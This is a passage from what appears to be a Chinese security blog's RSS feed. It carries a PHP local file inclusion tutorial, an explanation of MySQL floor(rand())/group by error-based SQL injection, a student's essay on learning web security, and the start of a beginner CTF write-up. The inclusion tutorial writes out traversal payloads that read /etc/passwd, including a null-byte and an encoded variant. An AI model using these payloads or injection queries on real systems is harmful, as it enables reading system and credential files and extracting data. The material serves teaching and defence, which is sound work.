&lt;p>wakeup(): 使进程从阻塞队列(block)中被唤醒，重新ready&lt;/p></description></item><item><title>PHP-FileInclusion</title><link>https://sera.wang/p/php-fileinclusion/</link><pubDate>Mon, 26 Mar 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/php-fileinclusion/</guid><description>&lt;p>文件包含(File Inclusion)可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下:&lt;/p>
&lt;p>PHP:&lt;/p>
&lt;blockquote>
&lt;p>include(),include_once(),require(),require_once().fopen(),readfile()…&lt;/p>
&lt;/blockquote>
&lt;p>JSP/Servlet:&lt;/p>
&lt;blockquote>
&lt;p>ava.io.File(),java.io.FileReader()…&lt;/p>
&lt;/blockquote>
&lt;p>ASP:&lt;/p>
&lt;blockquote>
&lt;p>include file,include virtual…&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;p>以PHP为例，一般用上述函数来导入一个文件，比如一个全是函数的function.php。当使用上述函数包含一个新的文件时，该文件将作为PHP代码执行(重点!)，PHP内核不会在意被包含的文件类型是什么，所以就算包含了txt文件，图片文件，远程URL，也都将作为PHP代码执行。这一特性，在实施攻击时将非常有用。&lt;/p>
&lt;p>比如以下代码:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;-?php include($_get['test']);=&amp;quot;&amp;quot; ?-=&amp;quot;&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>执行&lt;a class="link" href="http://www.test.com/test.php?test=atk.jpg" target="_blank" rel="noopener"
>www.test.com/test.php?test=atk.jpg&lt;/a>&lt;/p>
&lt;p>若atk.jpg中含有PHP攻击代码，则会被执行。&lt;/p>
&lt;p>可见，要想成功利用LFI漏洞，需满足条件:&lt;/p>
&lt;ol>
&lt;li>include()等函数通过动态变量的方式引入需要包含的文件；&lt;/li>
&lt;li>用户能够控制该动态变量；&lt;/li>
&lt;/ol>
&lt;p>如果web应用没有正确防御，可能会被读出重要本地数据，或者直接被执行了一个webshell等等。&lt;/p>
&lt;hr>
&lt;p>再深入看看文件包含漏洞的后果。&lt;/p>
&lt;p>1.本地文件包含&lt;/p>
&lt;p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion,简称LFI)&lt;/p>
&lt;p>比如一下代码就存在LFI漏洞:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;-?php $file=&amp;quot;$__GET['file'];&amp;quot; &amp;quot;..=&amp;quot;&amp;quot; ..=&amp;quot;&amp;quot; etc=&amp;quot;&amp;quot; passwd\0&amp;quot;=&amp;quot;&amp;quot; if(file_exists('=&amp;quot;&amp;quot; home=&amp;quot;&amp;quot; wwwrun=&amp;quot;&amp;quot; '.$file.'.php')){=&amp;quot;&amp;quot; include=&amp;quot;&amp;quot; '=&amp;quot;&amp;quot; '.$file.'.php';=&amp;quot;&amp;quot; }=&amp;quot;&amp;quot; ?-=&amp;quot;&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>此时如果用户控制$file变量为 ‘../../etc/passwd’,则会执行 include ‘/home/wwwrun/../../etc/passwd.php’。&lt;/p>
&lt;p>但passwd.php文件并不存在,所以什么事都没有了吗?&lt;/p>
&lt;p>…&lt;/p>
&lt;p>不，因为PHP内核是用C实现的，因此使用了C语言中的一些字符串处理函数。比如在连接字符串时，0字节(\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符，即&lt;/p>
&lt;blockquote>
&lt;p>../../etc/passwd\0&lt;/p>
&lt;/blockquote>
&lt;p>通过web输入时，只需要Url编码，变成&lt;/p>
&lt;blockquote>
&lt;p>../../etc/passwd%00&lt;/p>
&lt;/blockquote>
&lt;p>字符串截断配合LFI口味更佳&lt;/p>
&lt;p>所以web应用可以禁用0字节，因为用户其实是不需要使用它的。&lt;/p>
&lt;p>但这样实际上仍没有解决问题，还有个技巧就是利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在windows下256字节，linux下4096字节会达到最大值，最大值后的字符会被丢弃，于是构造 n个 ‘./‘即可&lt;/p>
&lt;p>比如:&lt;/p>
&lt;blockquote>
&lt;p>../../etc/./././././ …… passwd.php
或者
../../etc/////////// …… /////passwd.php&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;p>除了include()等4个函数，php能对文件进行操作的函数都有可能出现漏洞。虽然大多数情况下不能执行php代码，但是能够读取敏感文件（比如源代码，比如账号密码文件）带来的后果不言而喻。&lt;/p>
&lt;p>某些情况，目录遍历漏洞还可以用一些编码来绕过服务器端的逻辑&lt;/p>
&lt;p>比如&lt;/p>
&lt;p>%2e%2e%2f 等同于 ../&lt;/p>
&lt;p>%2e%2e/ 等同于 ../&lt;/p>
&lt;p>..%2f 等同于 ../&lt;/p>
&lt;p>..%5c 等同于 ..\&lt;/p>
&lt;p>之类&lt;/p>
&lt;p>解决此类漏洞方法:&lt;/p>
&lt;p>应该尽量避免包含动态的变量，禁用某些php导入外部url的函数，还有一种方式就是枚举用户变量(case…default)&lt;/p></description></item><item><title>SQL注入-报错注入原理</title><link>https://sera.wang/p/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</link><pubDate>Mon, 26 Mar 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</guid><description>&lt;p>先解释几个概念和语句&lt;/p>
&lt;h2 id="聚合函数">聚合函数&lt;/h2>
&lt;blockquote>
&lt;p>定义：SQL基本函数，聚合函数对一组值执行计算，并返回单个值。除了 COUNT 以外，聚合函数都会忽略空值。 聚合函数经常与 SELECT 语句的 GROUP BY 子句一起使用。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>性质: 所有聚合函数都具有确定性。任何时候用一组给定的输入值调用它们时，都返回相同的值。&lt;/p>
&lt;/blockquote>
&lt;p>举例:&lt;/p>
&lt;p>count() 返回指定组中项目的数量&lt;/p>
&lt;blockquote>
&lt;p>select count(id) from users; // 11&lt;/p>
&lt;/blockquote>
&lt;p>max() 返回指定数据的最大值&lt;/p>
&lt;blockquote>
&lt;p>select max(id) from users; //20&lt;/p>
&lt;/blockquote>
&lt;p>min()同理，其它还有像sum()求和，一般都是用于数字列。&lt;/p>
&lt;h2 id="group-by-语句">group by 语句&lt;/h2>
&lt;p>“Group By”从字面意义上理解就是根据“By”指定的规则对数据进行分组，所谓的分组就是将一个“数据集”划分成若干个“小区域”，然后针对若干个“小区域”进行数据处理。&lt;/p>
&lt;p>实质上就是按照某种属性分类汇总&lt;/p>
&lt;p>比如说要统计在全体中统计几个小类的各自情况，可以&lt;/p>
&lt;blockquote>
&lt;p>select 列名(能化成几个分类的)，某种属性比如sum(数量) as 数量之和 from table_name group by 列名&lt;/p>
&lt;/blockquote>
&lt;p>group by 列名就是按列名来分组。&lt;/p>
&lt;h2 id="count">count(*)&lt;/h2>
&lt;blockquote>
&lt;p>select count(*) from table_name;&lt;/p>
&lt;/blockquote>
&lt;p>返回table_name的行数；&lt;/p>
&lt;p>也可以&lt;/p>
&lt;blockquote>
&lt;p>select count(*) from table_name where id &amp;gt; 10;&lt;/p>
&lt;/blockquote>
&lt;h2 id="正文">#正文&lt;/h2>
&lt;p>我找来一句报错语句:&lt;/p>
&lt;pre tabindex="0">&lt;code>select count(),concat((select version()),floor(rand()2))a from test_table group by a;
&lt;/code>&lt;/pre>&lt;p>解释&lt;/p>
&lt;blockquote>
&lt;p>concat：为聚合函数，连接字符串功能&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>floor：取float的整数值&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>rand:取0~1之间随机浮点值，长度测试大概为16-19的样子，官方手册也没说明 ：P&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>group by：为聚合函数,根据一个或多个列对结果集进行分组并有排序功能&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>a为as a 别名的简写方式&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>floor(rand()*2) rand为0~1，rand（）*2为0~2，那么整个语句就是取0，1，2三个数字，rand（）为2的几率可以忽律不计，所以是 0，1两个随机数&lt;/p>
&lt;/blockquote>
&lt;p>ps: 测试语句中的test_table是我自建的一个表，行数为11，所以count(*)返回11；&lt;/p>
&lt;p>知道了语句作用之后，测试语句，在sql中执行发现，有时会报错有时却输出正常。这是为什么?&lt;/p>
&lt;p>不报错的话，结果是两行数据，如图：&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/50036228.jpg" alt="img" />&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/29323571.jpg" alt="img" />&lt;/p>
&lt;p>就放两张，报错的话，如图：&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/8582190.jpg" alt="img" />&lt;/p>
&lt;p>就放一张，其它报错信息类似，除了最后随机数不同之外..&lt;/p>
&lt;hr>
&lt;p>分析一下，发现test_table的行数是11，而count(*) 每次都是两行数据和是11。&lt;/p>
&lt;p>报错信息说，Error: 重复录入 ‘10.1.21-MariaDB0’ for key ‘group_key’&lt;/p>
&lt;p>也就是说 group by x 的这个x是作为新表的一个主键存在的，&lt;/p>
&lt;p>我们可以把语句精简一下，来测试看看&lt;/p>
&lt;blockquote>
&lt;p>select count(*) from test_table group by floor(rand()*2);&lt;/p>
&lt;/blockquote>
&lt;p>情况跟上面有点不一样，报错情况剧增，先来看为什么会出现这个报错呢?&lt;/p>
&lt;p>我们知道&lt;/p>
&lt;blockquote>
&lt;p>group by floor(rand()*2)&lt;/p>
&lt;/blockquote>
&lt;p>会随机产生两个值，（0，1），test_table中有11行数据，而select count(*)会产生两种总和为11的结果，结果集根据group by的值进行分组并且排序。&lt;/p>
&lt;p>所以正常结果有4种情况，(0,0) (0,1) (1,0) (1,1)，只是group by把(0,1)和(1,0)排序了。&lt;/p>
&lt;p>想不出来接下去怎么测试，参考前辈文章，把count(&lt;em>)换成1继续测试，发现返回结果都是正常的。
也就是说可不可以有这样一个结论，count(&lt;/em>)是聚合函数，只要是聚合函数就会有这类报错&lt;/p>
&lt;p>于是测试&lt;/p>
&lt;blockquote>
&lt;p>select max(test_column) from test_table group by floor(rand()*2);&lt;/p>
&lt;/blockquote>
&lt;p>又报错了，ok。测试其他函数像min(),sum(),avg()报错相同。&lt;/p>
&lt;p>那么为什么呢?&lt;/p>
&lt;p>…&lt;/p>
&lt;p>我不知道.&lt;/p>
&lt;p>前辈猜测：
（1）无其他聚合函数时，不会生成字典，只对指定字段进行分组
（2）有其他聚合函数时，根据指定字段生成字典，进行其他聚合函数计算，即使其他聚合函数没有使用该分组数据&lt;/p>
&lt;hr>
&lt;p>那么最后，我来做个总结:&lt;/p>
&lt;h2 id="报错几率">报错几率&lt;/h2>
&lt;p>这里我发现前辈结论是错的，floor(rand()*2)产生两个随机值，而对于group by floor(rand()*2)我的猜测是，比如目标列有11行，则它进行11次取值，以随机种子数为2举例，每次有(0,0) (0,1) (1,0) (1,1) 4种情况，取11次值，其中有2次值相同就会产生报错。
至少2次取到相同值的概率就是p=1-0.25 ^11次方，这个0.25的基数是跟随机种子数成正比，跟报错几率成反比。&lt;/p>
&lt;p>也就是说, 只要随机种子数够小，就会一直产生报错。&lt;/p>
&lt;p>好，于是以后我们就可以直接 rand()*0 这样就是百分百报错了。&lt;/p>
&lt;hr>
&lt;p>第二天想了下，可能不严谨，感觉结论推出过程有问题…比如group by 随机数 是这样取11次值吗之类的问题。需要研究一下mysql的实现源码，看看group by具体是如何实现的。&lt;/p>
&lt;p>测试了一下…结论肯定有问题…&lt;/p>
&lt;hr>
&lt;p>3/28:&lt;/p>
&lt;p>测试语句1：&lt;/p>
&lt;blockquote>
&lt;p>select count(*) from test_table group by floor(rand()*2);&lt;/p>
&lt;/blockquote>
&lt;p>测试语句2：&lt;/p>
&lt;blockquote>
&lt;p>select count(*) from test_table group by floor(rand(0)*2);&lt;/p>
&lt;/blockquote>
&lt;p>这里补充一些对rand()函数的解释，当rand()函数有参数时，结果是确定的&lt;/p>
&lt;p>比如rand(0),rand(1),rand(2)，它们都会返回一个确定的浮点数，没有了随机性。&lt;/p>
&lt;p>对于一个表，执行测试1和测试2，&lt;/p>
&lt;p>表中只有一条数据时，2个测试都是没有报错&lt;/p>
&lt;p>2条时:语句1有报错，但几率不高，语句2无报错&lt;/p>
&lt;p>3条时:语句1有报错，几率变高，语句2有报错，近乎百分百报错&lt;/p>
&lt;p>因为我认为floor(rand(0)&lt;em>2)是一个确定的数字，所以我尝试替换成0或者floor(0)，结果是不再报错了，可以推测 报错注入中 count(&lt;/em>)和 group by floor(rand(0)*2)可能是必要的一个搭配。&lt;/p>
&lt;p>而floor(rand()*2)和floor(rand(0)*2)之间的差别只是，前者具有不确定性(0~1间取值)，而后者具有确定性。&lt;/p>
&lt;p>那么对于 select count(*) from test_table group by key;//key是表中主键的名字&lt;/p>
&lt;p>我们猜测mysql遇到该语句时会建立一个虚拟表(实际上就是会建立虚拟表)&lt;/p>
&lt;p>对于这句语句来说，虚拟表有两列，一列是key(主键)，另一类是count(*)&lt;/p>
&lt;p>mysql执行此语句，开始查询数据，取数据库数据，然后查看虚拟表中key列下对应的值存在与否，不存在则插入新记录，存在则count(*)字段直接加1。&lt;/p>
&lt;p>mysql官方有给过提示，就是查询的时候使用rand()的话，该值会被计算多次，什么意思呢，就是在使用group by的时候，其实就是建立虚拟表然后查询，floor(rand(0)*2)会被执行一次，如果虚拟表不存在记录，插入虚表的时候会再被执行一次，我们来瞰下floor(rand(0)*2)报错的过程就知道了，&lt;/p>
&lt;p>首先，我们来看这句sql语句&lt;/p>
&lt;blockquote>
&lt;p>select floor(rand(0)*2) from test_table;（test_table有11条数据）&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/82566196.jpg" alt="img" />&lt;/p>
&lt;p>结果是这个的结果也有11条，怎么算的，之前说，查询的时候使用rand()，该值会被计算多次，这个语句可以理解成它执行了11次查询的结果为0 1 1 0 1 1 0 0 1 1 1&lt;/p>
&lt;p>那么再来看&lt;/p>
&lt;blockquote>
&lt;p>select count(*) from test_table group by floor(rand(0)*2);&lt;/p>
&lt;/blockquote>
&lt;p>查询前，mysql建立了一个虚拟表(空的)，取第一条记录，执行floor(rand(0)*2)，此时floor(rand(0)*2)结果为0，发现值不存在，所以要将0插入虚表，此时先执行一次floor(rand(0)*2)，结果变为1，最后其实插入了1。&lt;/p>
&lt;p>取第二条记录，执行floor(rand(0)*2)，此时floor(rand(0)&lt;em>2)结果为1，值存在，于是count(&lt;/em>) +1 ， 取第三条记录，执行floor(rand(0)*2)，此时结果为0，查询记录，不存在，于是要将0插入虚表，但插入时又要先执行一次floor(rand(0)*2)，此时结果变为1，跟先前的1就发生了冲突，也就是主键必须唯一这个规则被违反了，就造成了dumplicate entry，重复输入主键。&lt;/p>
&lt;p>floor(rand(0)*2) 具有确定性，它的值可以被推算出来，所以有三条记录时就必定能产生报错。(前提是 如果之前没有不小心查询建了个虚表，并且虚表中已经有了0和1，那么此时再执行就不会报错了)&lt;/p>
&lt;p>而floor(rand()*2)具有随机性，它的序列是随机的，所以有2条记录时就有几率产生报错了，比如第一次插了个0，第二次算出来结果是个1，然后要插了，又计算一次正好结果是0，于是报错。&lt;/p>
&lt;p>以上，就是原理。&lt;/p>
&lt;p>总之，报错注入需要 count(*),rand(),group by ，三者缺一不可。&lt;/p>
&lt;p>构造出来的语句一般是，&lt;/p>
&lt;blockquote>
&lt;p>select count(*) from target_table group by floor(rand(0)*2);&lt;/p>
&lt;/blockquote>
&lt;p>最后，感谢前辈白帽子们的分享和研究经验。&lt;/p>
&lt;p>参考链接:&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/kuangmang/article/details/43675061" target="_blank" rel="noopener"
>https://blog.csdn.net/kuangmang/article/details/43675061&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;amp;mid=403404979&amp;amp;idx=1&amp;amp;sn=27d10b6da357d72304086311cefd573e&amp;amp;scene=1&amp;amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener"
>https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect&lt;/a>&lt;/p>
&lt;/blockquote></description></item><item><title>校园杂记17: 我想吐槽的‘Web安全’</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B017-%E6%88%91%E6%83%B3%E5%90%90%E6%A7%BD%E7%9A%84web%E5%AE%89%E5%85%A8/</link><pubDate>Mon, 26 Mar 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B017-%E6%88%91%E6%83%B3%E5%90%90%E6%A7%BD%E7%9A%84web%E5%AE%89%E5%85%A8/</guid><description>&lt;p>web安全是什么?&lt;/p>
&lt;p>是渗透测试? 是机器学习搜索webshell? 是fuzz testing? 是ctf?&lt;/p>
&lt;p>是找出各种漏洞? 是各种技巧? 是如何安全的在网络中”摸鱼”?&lt;/p>
&lt;p>…&lt;/p>
&lt;p>每个人的答案都不一样，对此，我一脸懵逼。&lt;/p>
&lt;hr>
&lt;p>这是个非常大的话题，甚至于我觉得web安全也可以分很多个方向，但是再细分未免就有点枯燥了，一个人只专注于xss，csrf整天想着钓鱼，想着发钓鱼邮件写钓鱼worm，不久就会厌倦吧…于是web安全又有了sql注入，本地文件包含，浏览器安全，html5安全，css安全，文件上传，内网渗透，服务器提权，一坨东西不知道什么鬼啊。&lt;/p>
&lt;p>要能看懂xss，csrf漏洞，得学js吧，jquery也要了解下吧，什么? 前端框架层安全?? 等等再说&lt;/p>
&lt;p>要能看懂sql注入漏洞，php文件漏洞，得学php mysql吧，java，asp也要了解下吧，什么? structs 2漏洞了解下?? 以后再说吧&lt;/p>
&lt;p>python写的框架也是一坨漏洞。exp要用python写吧，python了解下? Django框架用都没用过哪来的时间和project用Django啊&lt;/p>
&lt;p>安全代码安全代码，因为代码是人写的，所以就不那么安全了。再有经验的engineer也会犯错，于是web安全，系统安全，密码学安全，信息安全，又是一坨，可以说，有代码的地方，就会有漏洞。虽然不应该那么绝对，但是当时写出来的代码没问题，一更新，可能更新之后就会出来问题，那就不更新了? 当然ok啊，但别的环境在更新，由不得你，别的环境的更新，伴随着跟它耦合着的代码也会慢慢的出现问题，所以，tk教主说的 安全是动态的，一点没错。&lt;/p>
&lt;p>这条路望过去望不到尽头，这辈子可能都无法学完。想到了这种结果后，upset吗?&lt;/p>
&lt;p>答:&lt;/p>
&lt;p>还行。I’m fine&lt;/p>
&lt;hr>
&lt;p>之前想写个ali插件，写不来想问问学长，聊着聊着就聊到在上的这个操作系统课，房老师←_←去年被汤老师带着去”开会”,是谈项目的一个会，瑟瑟发抖的听学长(跟我聊的这个)说项目完成的情况，加密的技术手段，会上房老师气场爆棚，这就是第一印象了，结果就是今天上操作系统走神10分钟，发现在点人回答问题了，点了几个人回答不出来，于是就拍桌子啊，吓cry。以为要第二次爆气场了，还好没有，吼吼吼吼….吼个头啊。&lt;/p>
&lt;p>对操作系统挺有兴趣的，加上之前学的计组，慢慢的就会有个pc机的轮廓出来，也因为操作系统的安全是个大问题，比如二进制安全，缓冲区溢出攻击等等…好像还涉及逆向?misc?&lt;/p>
&lt;p>对这块不是很了解…聊完了房头，再来聊聊挖漏洞…&lt;/p>
&lt;p>之前的我真是异想天开，天天yy当个nb的白帽子是多酷的事情。现在，除了觉得自己naive，还是naive，也许可以再加上个stupid。&lt;/p>
&lt;p>挖漏洞是半个小时就能做到的吗? 不一定，但我这种半吊子肯定做不到半小时，别说第一个漏洞了，别的安全研究员花几个月挖出一个cve，我一个小白却想几天或者半小时，并因为挖不出而感到困惑迷茫，真是有够funny…&lt;/p>
&lt;p>一口吃不成个胖子，这么简单的道理为什么总是不明白，挖不出就慢慢来，先夯实了基础再谈挖不挖得出漏洞，有了基础，每个地方都能得心应手，也不用再那么盲目，不会再想搜索完一个目标信息后下一步要干啥? sql注入? 扫注入点? 扫后台? 还是什么? 感到迷茫，慢慢分析，慢慢来，浮躁永远是大忌。我要吃忌啊啊啊啊啊啊。&lt;/p>
&lt;p>每天都在找鸡血，仿佛一天不打就hold不住的样子，最近找到一个很触动我的，在此贴上:&lt;/p>
&lt;blockquote>
&lt;p>‘’’入门web安全 作者:张某滨’’’
第一个问题无非就是怎么找目标？我目前也没有什么好方法。只能说多留心吧，前段时间买衣服，发现快递到货要装一个APP才能取件，于是我就装了。拿完衣服后，随手测试发现了该厂商存在的任意密码重置问题，在乌云上报了之后还说要给我发礼物。再分享一个故事，之前参加沙龙见到的核心白帽子：专业种田，听他介绍了Burpsuite的用法，怎么用搜索找洞等姿势，不过重点不是这个，重点是他在回深圳时需要去广州南站，然后他在广州南站发现了：广州高铁站手机充电终端沙盒绕过(可留后门控制手机)的漏洞，让我惊叹他真的是走到哪黑到哪。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>找到目标之后发现自己实力不够？这个需要基础知识加细心吧我觉得，绝大部分的漏洞并没有想象中的难，至少从我在乌云上看过的漏洞来说。SQL注入，名字大家都懂，工具sqlmap大家都可以用，可是用了之后知道内部原理吗？XSS打Cookies，需要懂前端知识吧？上传一句话GetShell，菜刀连接直捣黄龙，你需要知道人家用的什么后台吧，JSP/PHP/ASP/Python等等语言你得懂吧？正面刚人家找不到漏洞，可以找找旁域和C段，没有一点点DNS和IP地址的基础知识怎么能行呢？所以没有基础，即使漏洞摆在眼前也是白搭吧。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>所以，我觉得我还是要沉住气，不能浮夸，多多补充基础知识。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>看前人留下的资料：乌云上的漏洞很多精华的思路，多看，打开自己的眼界。（我目前只是看乌云园区里的讨论，乌云Wiki，乌云公开的漏洞）&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>有条件复现漏洞环境的尽量进行测试，多动手才好玩啊！比如最近公开的漏洞：【乌云峰会】网易闪电邮远程命令执行附思路分析，完全可以找个旧版本的软件玩玩，玩一次的记忆绝对比你光看要强。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>尝试分享，目前自己做的还不够，希望自己能静下心来多写写东西。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>这是我最近一段时间的经验分享和自己的一点思考，只是发出来供参考。关于找人带入门的问题：我觉得没人带一样可以找到很多东西学，智商不足勤奋补上嘛！要学会搜索！还有，这篇文章不是乌云的广告贴，我只是把在乌云上刷Rank当成激励自己的目标。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>—————2016年02月17号 更新分割线——————
在WooYun上我已经是一个普通白帽子，白帽子信息_zhchbin ，在我写下上面那个答案之后的这段时间，我发现了一个腾讯的XSS问题，若干个新浪微博的CSRF问题，知乎/bilibili/网易等厂商的用户微博OAuth2.0相关的漏洞。也有人看了我发的漏洞而学到了姿势，这也是我挺自豪的。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>在我个人的博客上也写了两篇总结文章，虽然阅读量不高，但也算欣慰自己能沉下心来总结。正所谓xsser在zone里说的：这个圈子目前有太多的浮躁，在过去一年的时间里也许很多人的机会增加了很多，但是有多少人关注自己真正成长了多少？ 我至少可以自豪的告诉自己，我应该成长了一些。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>—————2016年05月09号 更新分割线——————
最近在WooYun上发了一个通用漏洞，2345浏览器本地文件读取及远程命令执行，第一个获得乌云奖金的漏洞，特此更新一发，鸡冻的心情难以言表，感谢WooYun&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;p>静下心，一步步慢慢来，有始有终吧，共勉。&lt;/p>
&lt;p>话说我有很多鸡血的，要的可以私信噢。&lt;/p></description></item><item><title>WriteUp - Seclab</title><link>https://sera.wang/p/writeup-seclab/</link><pubDate>Sun, 18 Mar 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/writeup-seclab/</guid><description>&lt;p>前言：重新开始学习安全，用这个水题来暖手，当初步复习。&lt;/p>
&lt;p>看了下自己五个月之前的状态:&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/71610715.jpg" alt="img" />&lt;/p>
&lt;hr>
&lt;h2 id="基础关">基础关&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>key在哪里？&lt;/p>
&lt;p>右键查看源代码，得到key&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/29089604.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>再加密一次你就得到key啦~&lt;/p>
&lt;p>这题做不来，看的writeup，用的rot13加密，学习一下! rot13加密&lt;/p>
&lt;pre tabindex="0">&lt;code> 百科链接：http://www.baike.com/wiki/ROT13&amp;amp;prd=so_1_doc
ROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。ROT13是它自己本身的逆反；也就是说，要还原ROT13，套用加密同样的演算法即可得，故同样的操作可用再加密与解密。该演算法并没有提供真正的密码学上的保全，故它不应该被套用在需要保全的用途上。它常常被当作弱加密范例的典型。
描述：套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有26个，并且26=2×13，ROT13函数是它自己的逆反：
对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。
换句话说，两个连续的ROT13应用函式会回复原始文字（在数学上，这有时称之为对合（involution）；在密码学上，这叫做对等加密（reciprocalcipher））。
&lt;/code>&lt;/pre>&lt;p>所以最后结果是按照下表一一对应即可，数字不变&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/29344178.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>猜猜这是经过了多少次加密？&lt;/p>
&lt;p>看到加密后字符串最后是个等号，依稀记得base64加密最后也是个等号，猜测是base64加密，于是脚本解密如下:&lt;/p>
&lt;p>脚本编写时要注意，base64碰到无法解密之后会报错&lt;/p>
&lt;pre tabindex="0">&lt;code> import base64
code = 'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2